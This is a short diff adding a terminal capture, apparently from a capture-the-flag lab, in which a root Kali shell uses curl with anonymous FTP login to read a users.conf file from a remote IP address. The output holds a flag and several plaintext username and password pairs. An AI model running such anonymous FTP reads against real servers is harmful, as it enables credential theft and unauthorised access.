@@ -1,0 +1,9 @@
+┌──(root㉿kali)-[/]
+└─# curl ftp://anonymous:anonymous@98.95.207.28/users.conf                                                                                                                                                                                  
+# vsftpd user configuration
+# FLAG{c0nf1g_f1l3_r34d}
+
+anonymous:password123
+ftpadmin:ftp@dm1n123
+techcorp:TechCorp2024!
+guest:guest123
